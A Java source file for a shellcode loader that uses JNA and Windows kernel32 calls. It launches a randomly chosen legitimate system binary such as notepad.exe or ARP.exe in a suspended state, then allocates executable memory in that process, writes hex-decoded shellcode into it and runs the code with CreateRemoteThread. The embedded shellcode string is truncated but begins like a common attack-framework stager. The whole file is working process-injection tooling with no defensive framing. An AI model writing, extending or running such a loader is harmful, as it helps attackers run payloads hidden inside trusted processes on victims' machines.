import com.sun.jna.Memory;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.WinBase;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.platform.win32.WinNT.HANDLE;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.win32.StdCallLibrary;
import com.sun.jna.win32.W32APIOptions;

import java.util.Random;

public class ShellcodeLoader {
    static Kernel32 kernel32;
    static IKernel32 iKernel32;
    public static String[] ProcessArrayx32 = {"C:\\Windows\\SysWOW64\\ARP.exe", "C:\\Windows\\SysWOW64\\at.exe", "C:\\Windows\\SysWOW64\\auditpol.exe", "C:\\Windows\\SysWOW64\\bitsadmin.exe", "C:\\Windows\\SysWOW64\\bootcfg.exe", "C:\\Windows\\SysWOW64\\ByteCodeGenerator.exe", "C:\\Windows\\SysWOW64\\cacls.exe", "C:\\Windows\\SysWOW64\\chcp.com", "C:\\Windows\\SysWOW64\\CheckNetIsolation.exe", "C:\\Windows\\SysWOW64\\chkdsk.exe", "C:\\Windows\\SysWOW64\\choice.exe", "C:\\Windows\\SysWOW64\\cmdkey.exe", "C:\\Windows\\SysWOW64\\comp.exe", "C:\\Windows\\SysWOW64\\diskcomp.com", "C:\\Windows\\SysWOW64\\Dism.exe", "C:\\Windows\\SysWOW64\\esentutl.exe", "C:\\Windows\\SysWOW64\\expand.exe", "C:\\Windows\\SysWOW64\\fc.exe", "C:\\Windows\\SysWOW64\\find.exe", "C:\\Windows\\SysWOW64\\gpresult.exe"};
    public static String[] ProcessArrayx64 = {"C:\\Windows\\System32\\rundll32.exe", "C:\\Windows\\System32\\find.exe", "C:\\Windows\\System32\\notepad.exe", "C:\\Windows\\System32\\ARP.EXE"};

    static {
        kernel32 = (Kernel32) Native.loadLibrary(Kernel32.class, W32APIOptions.UNICODE_OPTIONS);
        iKernel32 = (IKernel32) Native.loadLibrary("kernel32", IKernel32.class);
    }


    public static void main(String[] args) {
        ShellcodeLoader jnaLoader = new ShellcodeLoader();
        String shellcode = "null";
        boolean is64 = false;
        shellcode = "fce8890000006****";

        /*
        switch (args.length) {
            case 1:
                is64 = false;
                shellcode = args[0];
                break;
            case 2:
                if ("--x64".equals(args[0])) {
                    is64 = true;
                }
                shellcode = args[1];
                break;
            default:
                System.out.println("Usage: java -jar ShellcodeLoader.jar shellcode_hex \n" +
                        "注入x64位shellcode: Usage: java -jar ShellcodeLoader.jar --x64 shellcode_hex");
                System.exit(1);
                break;
            }
          System.out.println("\nShellcode: \n" + shellcode);
         */


        jnaLoader.loadShellCode(shellcode, is64);
    }

    public void loadShellCode(String shellcodeHex, boolean is64) {

        String[] targetProcessArray = null;
        // java是64位且选择注入64位shellcode
        if (System.getProperty("sun.arch.data.model").equals("64") && is64) {
            targetProcessArray = ProcessArrayx64;
        } else { //默认注入32位进程
            targetProcessArray = ProcessArrayx32;
        }
        int j = targetProcessArray.length;
        byte b = 0;
        Random random = new Random();
        int k = b + random.nextInt(j);
        String targetProcess = targetProcessArray[k];
        this.loadShellCode(shellcodeHex, targetProcess);

    }

    public void loadShellCode(String shellcodeHex, String targetProcess) {
        //System.out.println("targetProcess: " + targetProcess);
        byte[] shellcode = hexStrToByteArray(shellcodeHex);
        int shellcodeSize = shellcode.length;
        IntByReference intByReference = new IntByReference(0);
        Memory memory = new Memory((long) shellcodeSize);

        for (int j = 0; j < shellcodeSize; ++j) {
            memory.setByte((long) j, shellcode[j]);
        }

        WinBase.PROCESS_INFORMATION pROCESS_INFORMATION = new WinBase.PROCESS_INFORMATION();
        WinBase.STARTUPINFO sTARTUPINFO = new WinBase.STARTUPINFO();
        sTARTUPINFO.cb = new WinDef.DWORD((long) pROCESS_INFORMATION.size());
        if (kernel32.CreateProcess(targetProcess, (String) null, (WinBase.SECURITY_ATTRIBUTES) null, (WinBase.SECURITY_ATTRIBUTES) null, false, new WinDef.DWORD(4L), (Pointer) null, (String) null, sTARTUPINFO, pROCESS_INFORMATION)) {
            Pointer pointer = iKernel32.VirtualAllocEx(pROCESS_INFORMATION.hProcess, Pointer.createConstant(0), shellcodeSize, 4096, 64);
            iKernel32.WriteProcessMemory(pROCESS_INFORMATION.hProcess, pointer, memory, shellcodeSize, intByReference);
            HANDLE hANDLE = iKernel32.CreateRemoteThread(pROCESS_INFORMATION.hProcess, (Object) null, 0, pointer, 0, 0, (Object) null);
            kernel32.WaitForSingleObject(hANDLE, -1);
        }
    }


    public static byte[] hexStrToByteArray(String str) {
        if (str == null) {
            return null;
        } else if (str.length() == 0) {
            return new byte[0];
        } else {
            byte[] byteArray = new byte[str.length() / 2];

            for (int i = 0; i < byteArray.length; ++i) {
                String subStr = str.substring(2 * i, 2 * i + 2);
                byteArray[i] = (byte) Integer.parseInt(subStr, 16);
            }

            return byteArray;
        }
    }

    interface IKernel32 extends StdCallLibrary {
        Pointer VirtualAlloc(Pointer var1, int var2, int var3, int var4);

        HANDLE CreateThread(Object var1, int var2, Pointer var3, int var4, int var5, Object var6);

        Pointer VirtualAllocEx(HANDLE var1, Pointer var2, int var3, int var4, int var5);

        HANDLE CreateRemoteThread(HANDLE var1, Object var2, int var3, Pointer var4, int var5, int var6, Object var7);

        boolean WriteProcessMemory(WinNT.HANDLE param1HANDLE, Pointer param1Pointer1, Pointer param1Pointer2, int param1Int, IntByReference param1IntByReference);

        boolean ReadProcessMemory(Pointer var1, int var2, Pointer var3, int var4, IntByReference var5);

        int VirtualQueryEx(Pointer var1, Pointer var2, Pointer var3, int var4);

        Pointer OpenProcess(int var1, boolean var2, int var3);

        Pointer GetCurrentProcess();
    }
}
